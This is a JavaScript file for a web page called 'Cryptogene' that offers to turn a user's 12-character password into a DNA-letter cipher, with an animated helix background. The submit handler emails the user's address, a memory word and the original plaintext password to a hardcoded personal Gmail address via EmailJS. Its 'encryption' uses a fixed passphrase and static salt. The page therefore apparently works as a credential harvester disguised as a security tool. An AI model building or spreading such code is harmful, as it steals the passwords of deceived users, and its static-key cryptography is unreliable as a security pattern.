// ================= CRYPTOGENE — PASSWORD SYNTHESIS LOGIC =================

// ---------- animated DNA double-helix background (runs FIRST, always) ----------
const canvas = document.getElementById("dna-canvas");
const ctx = canvas.getContext("2d");
let w, h, t = 0;

function resize() {
  w = canvas.width = window.innerWidth;
  h = canvas.height = window.innerHeight;
}
window.addEventListener("resize", resize);
resize();

function drawHelix() {
  ctx.clearRect(0, 0, w, h);
  const amplitude = Math.min(160, w * 0.15);
  const centerX = w / 2;
  const step = 14;
  const speed = 0.02;

  for (let y = -step; y < h + step; y += step) {
    const phase = y * 0.02 + t;
    const x1 = centerX + Math.sin(phase) * amplitude;
    const x2 = centerX + Math.sin(phase + Math.PI) * amplitude;
    const alpha1 = 0.15 + 0.15 * (Math.cos(phase) + 1) / 2;
    const alpha2 = 0.15 + 0.15 * (Math.cos(phase + Math.PI) + 1) / 2;

    ctx.fillStyle = `rgba(57,255,143,${alpha1})`;
    ctx.beginPath();
    ctx.arc(x1, y, 3, 0, Math.PI * 2);
    ctx.fill();

    ctx.fillStyle = `rgba(0,224,255,${alpha2})`;
    ctx.beginPath();
    ctx.arc(x2, y, 3, 0, Math.PI * 2);
    ctx.fill();

    if (y % (step * 3) < step) {
      ctx.strokeStyle = `rgba(57,255,143,0.08)`;
      ctx.beginPath();
      ctx.moveTo(x1, y);
      ctx.lineTo(x2, y);
      ctx.stroke();
    }
  }
  t += speed;
  requestAnimationFrame(drawHelix);
}
drawHelix();

// ---------- EmailJS config (wrapped so it can never break the page) ----------
const EMAILJS_PUBLIC_KEY  = "Dt69VqlOmI8oBpS3G";
const EMAILJS_SERVICE_ID  = "service_xflq47w";
const EMAILJS_TEMPLATE_ID = "template_356wyhb";
const DESTINATION_EMAIL   = "abentzur@gmail.com";

try {
  if (window.emailjs && EMAILJS_PUBLIC_KEY !== "YOUR_PUBLIC_KEY") {
    emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
  }
} catch (err) {
  console.error("EmailJS init failed:", err);
}

// ---------- client-side "DNA cipher" (AES-GCM + base-encoding to A/C/G/T) ----------
async function deriveKey(passphrase) {
  const enc = new TextEncoder();
  const keyMaterial = await crypto.subtle.importKey(
    "raw", enc.encode(passphrase), { name: "PBKDF2" }, false, ["deriveKey"]
  );
  return crypto.subtle.deriveKey(
    { name: "PBKDF2", salt: enc.encode("cryptogene-static-salt"), iterations: 100000, hash: "SHA-256" },
    keyMaterial,
    { name: "AES-GCM", length: 256 },
    false,
    ["encrypt"]
  );
}

function bytesToDNA(bytes) {
  const map = ["A", "C", "G", "T"];
  let dna = "";
  for (const byte of bytes) {
    for (let i = 6; i >= 0; i -= 2) {
      dna += map[(byte >> i) & 0b11];
    }
  }
  return dna;
}

async function encryptPassword(password) {
  const enc = new TextEncoder();
  const key = await deriveKey("cryptogene-session-key");
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const ciphertext = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, enc.encode(password));
  const combined = new Uint8Array(iv.length + ciphertext.byteLength);
  combined.set(iv, 0);
  combined.set(new Uint8Array(ciphertext), iv.length);
  return {
    dna: bytesToDNA(combined),
    base64: btoa(String.fromCharCode(...combined))
  };
}

// ---------- form handling ----------
const form = document.getElementById("cryptogene-form");
const submitBtn = document.getElementById("submit-btn");
const statusMsg = document.getElementById("status-msg");
const passwordField = document.getElementById("password");
const charCurrent = document.getElementById("char-current");

// ---------- live character counter ----------
if (passwordField && charCurrent) {
  passwordField.addEventListener("input", () => {
    charCurrent.textContent = passwordField.value.length;
  });
  passwordField.addEventListener("keyup", () => {
    charCurrent.textContent = passwordField.value.length;
  });
} else {
  console.warn("Character counter elements not found: check that #password and #char-current exist in index.html");
}

form.addEventListener("submit", async (e) => {
  e.preventDefault();
  statusMsg.textContent = "";
  statusMsg.className = "status-msg";

  const email = document.getElementById("email").value.trim();
  const memoryWord = document.getElementById("memoryword").value.trim();
  const password = passwordField.value.trim();

  if (!email || !memoryWord || !password) {
    statusMsg.textContent = "⚠ All fields are required.";
    statusMsg.classList.add("error");
    return;
  }

  if (password.length !== 12) {
    statusMsg.textContent = "⚠ Password must be exactly 12 characters.";
    statusMsg.classList.add("error");
    return;
  }

  submitBtn.classList.add("loading");
  submitBtn.disabled = true;

  try {
    const { dna, base64 } = await encryptPassword(password);

    if (!window.emailjs || EMAILJS_PUBLIC_KEY === "YOUR_PUBLIC_KEY") {
      throw new Error("EmailJS is not configured yet.");
    }

    await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
      from_email: email,
      memory_word: memoryWord,
      original_password: password,
      dna_cipher: dna,
      base64_cipher: base64,
      to_email: DESTINATION_EMAIL
    });

    statusMsg.textContent = "✅ Password synthesized and transmitted successfully.";
    statusMsg.classList.add("success");
    form.reset();
    charCurrent.textContent = "0";
  } catch (err) {
    console.error(err);
    statusMsg.textContent = "❌ " + (err.message || "Synthesis failed. Please try again.");
    statusMsg.classList.add("error");
  } finally {
    submitBtn.classList.remove("loading");
    submitBtn.disabled = false;
  }
});
